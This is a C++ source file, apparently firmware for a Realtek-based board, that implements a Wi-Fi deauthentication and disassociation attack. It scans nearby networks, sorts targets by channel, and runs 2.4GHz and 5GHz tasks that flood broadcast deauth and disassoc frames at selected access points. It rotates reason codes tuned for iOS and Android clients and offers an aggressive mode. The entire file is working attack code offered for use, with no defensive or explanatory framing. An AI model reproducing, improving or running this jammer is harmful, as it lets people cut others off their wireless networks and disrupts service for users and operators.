#include "attack.h"

// Frame counts
#define FRAMES_PER_DEAUTH_24 OPTIMIZED_FRAMES_24
#define FRAMES_PER_DEAUTH_5  OPTIMIZED_FRAMES_5
#define FRAMES_PER_BEACON    20  // Beacons per fake network
#define FAKE_NETWORKS_COUNT  30  // Number of fake networks to broadcast

const unsigned long ATTACK_INTERVAL_24 = OPTIMIZED_INTERVAL_24;
const unsigned long ATTACK_INTERVAL_5  = OPTIMIZED_INTERVAL_5;

// Local variables
static unsigned long lastAttackTime24 = 0;
static unsigned long lastAttackTime5  = 0;
static int currentTargetIndex24 = 0;
static int currentTargetIndex5  = 0;
static int globalReasonIndex = 0;
static int currentFramesDeauth24 = FRAMES_PER_DEAUTH_24;
static int currentFramesDeauth5  = FRAMES_PER_DEAUTH_5;

// Reason code arrays
const uint16_t REASONS_STANDARD[] = {1, 2, 3, 4, 5, 6, 7, 8};
const uint16_t REASONS_SECURITY[] = {13, 14, 15, 16, 17, 18, 19, 20};
const uint16_t REASONS_IOS[] = {2, 3, 4, 6, 7, 8, 9, 10, 11};
const uint16_t REASONS_ANDROID[] = {1, 4, 5, 14, 15, 16, 17, 23};
const uint16_t REASONS_ALL[] = {1,2,3,4,5,6,7,8,9,10,13,14,15,16,17,18,19,20,21,22,23,24};

const int REASONS_STANDARD_COUNT = 8;
const int REASONS_SECURITY_COUNT = 8;
const int REASONS_IOS_COUNT = 9;
const int REASONS_ANDROID_COUNT = 8;
const int REASONS_ALL_COUNT = 22;

// Active reason codes (default: all)
const uint16_t* activeReasons = REASONS_ALL;
int activeReasonCount = REASONS_ALL_COUNT;

// Generate random MAC address for fake beacons
void generateRandomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) {
    mac[i] = random(0, 256);
  }
  // Set locally administered bit (second least significant bit of first byte)
  mac[0] |= 0x02;
  // Clear multicast bit
  mac[0] &= 0xFE;
}

// Thread-safe channel switching
void switchChannelSafe(uint8_t ch) {
  if (channelMutex != NULL && xSemaphoreTake(channelMutex, pdMS_TO_TICKS(10)) == pdTRUE) {
    if (currentChannel != ch) {
      wext_set_channel(WLAN0_NAME, ch);
      currentChannel = ch;
      delayMicroseconds(CHANNEL_SWITCH_DELAY_US);
    }
    xSemaphoreGive(channelMutex);
  }
}

// Send attack frames based on current mode
void sendAttackBurst(uint8_t* bssid, int frameCount) {
  uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
  
  switch (currentAttackMode) {
    case ATTACK_DEAUTH_ONLY:
      for (int i = 0; i < frameCount; i++) {
        uint16_t reason = activeReasons[globalReasonIndex];
        wifi_tx_deauth_frame(bssid, broadcast, reason);
        globalReasonIndex = (globalReasonIndex + 1) % activeReasonCount;
        if (FRAME_DELAY_US > 0) delayMicroseconds(FRAME_DELAY_US);
      }
      break;
      
    case ATTACK_DISASSOC_ONLY:
      for (int i = 0; i < frameCount; i++) {
        uint16_t reason = activeReasons[globalReasonIndex];
        wifi_tx_disassoc_frame(bssid, broadcast, reason);
        globalReasonIndex = (globalReasonIndex + 1) % activeReasonCount;
        if (FRAME_DELAY_US > 0) delayMicroseconds(FRAME_DELAY_US);
      }
      break;
      
    case ATTACK_COMBO:
      for (int i = 0; i < frameCount; i++) {
        uint16_t reason = activeReasons[globalReasonIndex];
        if (i % 2 == 0) {
          wifi_tx_deauth_frame(bssid, broadcast, reason);
        } else {
          wifi_tx_disassoc_frame(bssid, broadcast, reason);
        }
        globalReasonIndex = (globalReasonIndex + 1) % activeReasonCount;
        if (FRAME_DELAY_US > 0) delayMicroseconds(FRAME_DELAY_US);
      }
      break;
      
    case ATTACK_AGGRESSIVE:
      for (int i = 0; i < frameCount * 2; i++) {
        uint16_t reason = REASONS_ALL[i % REASONS_ALL_COUNT];
        if (i % 3 == 0) {
          wifi_tx_deauth_frame(bssid, broadcast, reason);
        } else if (i % 3 == 1) {
          wifi_tx_disassoc_frame(bssid, broadcast, reason);
        } else {
          wifi_tx_deauth_frame(broadcast, bssid, reason);
        }
      }
      break;
  }
}

// Sort targets by channel
int compareTargets(const void *a, const void *b) {
  int idxA = *(const int*)a;
  int idxB = *(const int*)b;
  return scan_results[idxA].channel - scan_results[idxB].channel;
}

void sortTargetsByChannel(std::vector<int>& targets) {
  qsort(targets.data(), targets.size(), sizeof(int), compareTargets);
}

// Scan result handler
rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  if (scan_result->scan_complete == 0) {
    // Limit to MAX_SCAN_RESULTS
    if (scan_results.size() >= MAX_SCAN_RESULTS) {
      return RTW_SUCCESS;  // Skip if already at limit
    }
    
    rtw_scan_result_t *record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(result.bssid, &record->BSSID, 6);
    
    char bssid_str[18] = {0};
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X",
             result.bssid[0], result.bssid[1], result.bssid[2],
             result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = String(bssid_str);
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  currentState = STATE_SCANNING;
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...\n");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    vTaskDelay(pdMS_TO_TICKS(5000));
    DEBUG_SER_PRINT("Scan done! Found " + String(scan_results.size()) + " networks\n");
    currentState = STATE_IDLE;
    return 0;
  } else {
    DEBUG_SER_PRINT("Scan failed!\n");
    currentState = STATE_IDLE;
    return 1;
  }
}

// 2.4GHz Attack Task
void AttackTask24(void *pvParameters) {
  (void) pvParameters;
  
  while (1) {
    if (currentState == STATE_ATTACK && !attack_targets_24.empty()) {
      unsigned long now = millis();
      unsigned long timesliceEnd = now + BAND_TIMESLICE_MS;
      
      while (millis() < timesliceEnd && currentState == STATE_ATTACK) {
        if (millis() - lastAttackTime24 >= ATTACK_INTERVAL_24) {
          int idx = attack_targets_24[currentTargetIndex24];
          if (idx >= 0 && idx < (int)scan_results.size()) {
            uint8_t targetChannel = scan_results[idx].channel;
            switchChannelSafe(targetChannel);
            
            // Batch attack all targets on same channel
            for (size_t i = currentTargetIndex24; 
                 i < attack_targets_24.size() && 
                 scan_results[attack_targets_24[i]].channel == targetChannel; 
                 i++) {
              int targetIdx = attack_targets_24[i];
              memcpy(deauth_bssid, scan_results[targetIdx].bssid, 6);
              sendAttackBurst(deauth_bssid, currentFramesDeauth24);
              totalFramesSent24 += currentFramesDeauth24;
              currentTargetIndex24++;
            }
            
            if (currentTargetIndex24 >= (int)attack_targets_24.size()) {
              currentTargetIndex24 = 0;
            }
          }
          lastAttackTime24 = millis();
        }
        vTaskDelay(pdMS_TO_TICKS(1));
      }
    }
    vTaskDelay(pdMS_TO_TICKS(5));
  }
}

// 5GHz Attack Task
void AttackTask5(void *pvParameters) {
  (void) pvParameters;
  
  while (1) {
    if (currentState == STATE_ATTACK && !attack_targets_5.empty()) {
      unsigned long now = millis();
      unsigned long timesliceEnd = now + BAND_TIMESLICE_MS;
      
      while (millis() < timesliceEnd && currentState == STATE_ATTACK) {
        if (millis() - lastAttackTime5 >= ATTACK_INTERVAL_5) {
          int idx = attack_targets_5[currentTargetIndex5];
          if (idx >= 0 && idx < (int)scan_results.size()) {
            uint8_t targetChannel = scan_results[idx].channel;
            switchChannelSafe(targetChannel);
            
            for (size_t i = currentTargetIndex5; 
                 i < attack_targets_5.size() && 
                 scan_results[attack_targets_5[i]].channel == targetChannel; 
                 i++) {
              int targetIdx = attack_targets_5[i];
              memcpy(deauth_bssid, scan_results[targetIdx].bssid, 6);
              sendAttackBurst(deauth_bssid, currentFramesDeauth5);
              totalFramesSent5 += currentFramesDeauth5;
              currentTargetIndex5++;
            }
            
            if (currentTargetIndex5 >= (int)attack_targets_5.size()) {
              currentTargetIndex5 = 0;
            }
          }
          lastAttackTime5 = millis();
        }
        vTaskDelay(pdMS_TO_TICKS(1));
      }
    }
    vTaskDelay(pdMS_TO_TICKS(5));
  }
}

// BeaconTask removed - replaced by KarmaTask in karma.cpp
